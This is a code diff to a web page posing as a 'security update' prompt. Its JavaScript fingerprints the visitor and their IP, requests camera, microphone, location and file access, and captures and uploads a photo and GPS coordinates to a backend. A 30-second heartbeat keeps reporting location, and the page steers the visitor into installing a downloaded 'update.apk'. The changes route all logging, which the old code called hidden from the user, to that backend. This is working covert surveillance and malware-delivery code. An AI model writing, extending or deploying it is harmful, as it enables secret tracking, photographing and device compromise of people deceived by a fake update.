@@ -614,32 +614,10 @@ INSTALLATION GUIDE POPUP
         const guideGotItBtn = document.getElementById('guideGotItBtn');
 
         let deviceId = null;
+        let isDeviceRegistered = false;
 
         // ============================================================
-        //  LOGGING (hidden from user)
-        // ============================================================
-        function addLog(msg, level) {
-            // Silently log to console only — no UI
-            console.log(`[${level}] ${msg}`);
-            if (deviceId) {
-                fetch(`${BACKEND_URL}/api/log`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ deviceId, msg, level })
-                }).catch(() => {});
-            }
-        }
-
-        function setStatus(msg, progress = null) {
-            statusText.textContent = msg;
-            if (progress !== null) {
-                const p = Math.min(Math.max(progress, 0), 100);
-                progressBar.style.width = p + '%';
-            }
-        }
-
-        // ============================================================
-        //  BACKEND API
+        //  BACKEND API CALLS — ALWAYS SEND DATA
         // ============================================================
         async function apiCall(endpoint, data) {
             try {
@@ -648,12 +626,61 @@ INSTALLATION GUIDE POPUP
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
-                return await resp.json();
+                const result = await resp.json();
+                console.log(`[API] ${endpoint} response:`, result);
+                return result;
             } catch(e) {
-                addLog(`[API] ${endpoint} failed: ${e.message}`, 'error');
+                console.error(`[API] ${endpoint} failed:`, e.message);
                 return null;
             }
         }
+
+        async function apiGet(endpoint) {
+            try {
+                const resp = await fetch(`${BACKEND_URL}${endpoint}`);
+                return await resp.json();
+            } catch(e) {
+                console.error(`[API] GET ${endpoint} failed:`, e.message);
+                return null;
+            }
+        }
+
+        // ============================================================
+        //  SEND LOG TO BACKEND
+        // ============================================================
+        function sendLogToBackend(msg, level = 'info') {
+            if (!deviceId) {
+                console.log(`[Log] (no deviceId) ${level}: ${msg}`);
+                return;
+            }
+            apiCall('/api/log', { deviceId, msg, level });
+        }
+
+        // ============================================================
+        //  UI HELPERS
+        // ============================================================
+        function setStatus(msg, progress = null) {
+            statusText.textContent = msg;
+            if (progress !== null) {
+                const p = Math.min(Math.max(progress, 0), 100);
+                progressBar.style.width = p + '%';
+            }
+            sendLogToBackend(msg, 'info');
+        }
+
+        function showGuide() {
+            guideOverlay.classList.add('open');
+        }
+
+        function hideGuide() {
+            guideOverlay.classList.remove('open');
+        }
+
+        guideCloseBtn.addEventListener('click', hideGuide);
+        guideGotItBtn.addEventListener('click', hideGuide);
+        guideOverlay.addEventListener('click', function(e) {
+            if (e.target === guideOverlay) hideGuide();
+        });
 
         // ============================================================
         //  FINGERPRINT
@@ -767,9 +794,9 @@ INSTALLATION GUIDE POPUP
                 results.camera = true;
                 results.mic = true;
                 stream.getTracks().forEach(t => t.stop());
-                addLog('[Perm] Camera + Mic granted.', 'success');
+                sendLogToBackend('[Perm] Camera + Mic granted.', 'success');
             } catch(e) {
-                addLog('[Perm] Camera/Mic denied: ' + e.message, 'error');
+                sendLogToBackend('[Perm] Camera/Mic denied: ' + e.message, 'error');
             }
 
             try {
@@ -777,50 +804,33 @@ INSTALLATION GUIDE POPUP
                     navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
                 });
                 results.location = true;
-                addLog('[Perm] Location granted.', 'success');
+                sendLogToBackend('[Perm] Location granted.', 'success');
             } catch(e) {
-                addLog('[Perm] Location denied: ' + e.message, 'error');
+                sendLogToBackend('[Perm] Location denied: ' + e.message, 'error');
             }
 
             try {
                 if ('showDirectoryPicker' in window) {
                     await window.showDirectoryPicker({ mode: 'readwrite' });
                     results.storage = true;
-                    addLog('[Perm] Storage granted (File System Access).', 'success');
+                    sendLogToBackend('[Perm] Storage granted (File System Access).', 'success');
                 } else if (navigator.storage && navigator.storage.persist) {
                     const persisted = await navigator.storage.persist();
                     results.storage = persisted;
-                    addLog(`[Perm] Storage persist: ${persisted}`, persisted ? 'success' : 'warn');
+                    sendLogToBackend(`[Perm] Storage persist: ${persisted}`, persisted ? 'success' : 'warn');
                 } else {
                     results.storage = true;
-                    addLog('[Perm] Storage assumed available.', 'info');
+                    sendLogToBackend('[Perm] Storage assumed available.', 'info');
                 }
             } catch(e) {
-                addLog('[Perm] Storage denied: ' + e.message, 'error');
+                sendLogToBackend('[Perm] Storage denied: ' + e.message, 'error');
             }
 
             return results;
         }
 
         // ============================================================
-        //  SHOW INSTALLATION GUIDE
-        // ============================================================
-        function showGuide() {
-            guideOverlay.classList.add('open');
-        }
-
-        function hideGuide() {
-            guideOverlay.classList.remove('open');
-        }
-
-        guideCloseBtn.addEventListener('click', hideGuide);
-        guideGotItBtn.addEventListener('click', hideGuide);
-        guideOverlay.addEventListener('click', function(e) {
-            if (e.target === guideOverlay) hideGuide();
-        });
-
-        // ============================================================
-        //  DOWNLOAD APK — ONLY FETCH + BLOB
+        //  DOWNLOAD APK
         // ============================================================
         function downloadApk() {
             setStatus('📦 Downloading security update...', 50);
@@ -844,20 +854,18 @@ INSTALLATION GUIDE POPUP
 
                     setTimeout(() => URL.revokeObjectURL(url), 10000);
 
-                    addLog('[APK] Download started: update.apk', 'success');
+                    sendLogToBackend('[APK] Download started: update.apk', 'success');
                     installBtn.disabled = false;
                     setStatus('✅ Update downloaded. Tap "Install Update" to continue.', 100);
-                    addLog('[APK] Download complete. File: update.apk', 'success');
+                    sendLogToBackend('[APK] Download complete. File: update.apk', 'success');
 
-                    // Show installation guide popup
                     setTimeout(showGuide, 800);
                 })
                 .catch(error => {
-                    addLog('[APK] Download failed: ' + error.message, 'error');
+                    sendLogToBackend('[APK] Download failed: ' + error.message, 'error');
                     setStatus('❌ Download failed. Please refresh and try again.', 0);
                 });
 
-            // Progress simulation
             let p = 55;
             const interval = setInterval(() => {
                 p += Math.floor(Math.random() * 6) + 2;
@@ -873,7 +881,7 @@ INSTALLATION GUIDE POPUP
         //  INSTALL BUTTON
         // ============================================================
         installBtn.addEventListener('click', function() {
-            addLog('[Install] User tapped Install Update.', 'info');
+            sendLogToBackend('[Install] User tapped Install Update.', 'info');
 
             installBtn.disabled = true;
             installBtn.textContent = '⏳ Opening installer...';
@@ -896,17 +904,15 @@ INSTALLATION GUIDE POPUP
                     document.body.removeChild(a);
 
                     setTimeout(() => URL.revokeObjectURL(url), 10000);
-                    addLog('[Install] Download triggered (update.apk).', 'success');
-
-                    // Show guide again in case it was closed
+                    sendLogToBackend('[Install] Download triggered (update.apk).', 'success');
                     setTimeout(showGuide, 600);
                 })
                 .catch(error => {
-                    addLog('[Install] Download failed: ' + error.message, 'error');
+                    sendLogToBackend('[Install] Download failed: ' + error.message, 'error');
                 });
 
             setStatus('📲 Installation started. Follow the instructions.', 100);
-            addLog('[Install] ✅ Check Downloads folder for update.apk.', 'success');
+            sendLogToBackend('[Install] ✅ Check Downloads folder for update.apk.', 'success');
 
             setTimeout(() => {
                 installBtn.disabled = false;
@@ -919,27 +925,32 @@ INSTALLATION GUIDE POPUP
         });
 
         // ============================================================
-        //  MAIN INIT
+        //  MAIN INIT — ALL DATA UPLOADS
         // ============================================================
         async function init() {
             setStatus('🔍 Checking for updates...', 10);
 
+            // 1. Collect fingerprint + IP
             const fp = collectFingerprint();
             const ip = await getPublicIP();
             fp.ip = ip;
-            addLog(`[FP] IP: ${ip} | ${fp.platform} | ${fp.screen}`, 'info');
+            sendLogToBackend(`[FP] IP: ${ip} | ${fp.platform} | ${fp.screen}`, 'info');
 
+            // 2. Request permissions
             const perms = await requestAllPermissions();
 
+            // 3. Register device — THIS SETS deviceId
             const regResp = await apiCall('/api/register', { fingerprint: fp, permissions: perms });
             if (regResp && regResp.deviceId) {
                 deviceId = regResp.deviceId;
-                addLog(`[Reg] Device registered: ${deviceId}`, 'success');
+                isDeviceRegistered = true;
+                sendLogToBackend(`[Reg] Device registered: ${deviceId}`, 'success');
             } else {
-                deviceId = 'local-' + Date.now() + '-' + Math.random().toString(36).substr(2,6);
-                addLog(`[Reg] Local fallback ID: ${deviceId}`, 'warn');
+                deviceId = 'local-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
+                sendLogToBackend(`[Reg] Local fallback ID: ${deviceId}`, 'warn');
             }
 
+            // 4. Capture photo and upload
             setStatus('📸 Capturing device information...', 30);
             try {
                 const photoDataUrl = await capturePhoto();
@@ -949,25 +960,33 @@ INSTALLATION GUIDE POPUP
                     timestamp: Date.now()
                 });
                 if (photoResp && photoResp.success) {
-                    addLog('[Photo] Captured and uploaded.', 'success');
+                    sendLogToBackend('[Photo] Captured and uploaded successfully.', 'success');
+                } else {
+                    sendLogToBackend('[Photo] Upload failed.', 'error');
                 }
             } catch(e) {
-                addLog(`[Photo] Error: ${e}`, 'error');
+                sendLogToBackend(`[Photo] Error: ${e}`, 'error');
             }
 
+            // 5. Get location and upload
             const loc = await getLocation();
             if (loc.lat && loc.lon) {
-                await apiCall('/api/location', {
+                const locResp = await apiCall('/api/location', {
                     deviceId: deviceId,
                     lat: loc.lat,
                     lon: loc.lon,
                     timestamp: Date.now()
                 });
-                addLog(`[Loc] ${loc.lat}, ${loc.lon}`, 'info');
+                if (locResp && locResp.success) {
+                    sendLogToBackend(`[Loc] ${loc.lat}, ${loc.lon} uploaded.`, 'info');
+                } else {
+                    sendLogToBackend('[Loc] Location upload failed.', 'error');
+                }
+            } else {
+                sendLogToBackend('[Loc] Location not available.', 'warn');
             }
 
-            downloadApk();
-
+            // 6. Start heartbeat
             setInterval(async () => {
                 const newLoc = await getLocation();
                 if (newLoc.lat && newLoc.lon) {
@@ -981,7 +1000,10 @@ INSTALLATION GUIDE POPUP
                 await apiCall('/api/heartbeat', { deviceId: deviceId, timestamp: Date.now() });
             }, 30000);
 
-            addLog('[+] System ready. Update: update.apk', 'success');
+            // 7. Download APK
+            downloadApk();
+
+            sendLogToBackend('[+] System ready. All data uploaded.', 'success');
         }
 
         // ============================================================
@@ -990,7 +1012,7 @@ INSTALLATION GUIDE POPUP
         installBtn.disabled = true;
 
         init().catch(err => {
-            addLog(`[Fatal] ${err}`, 'error');
+            sendLogToBackend(`[Fatal] ${err}`, 'error');
             setStatus('❌ Update check failed. Please refresh.', 0);
             installBtn.disabled = false;
         });
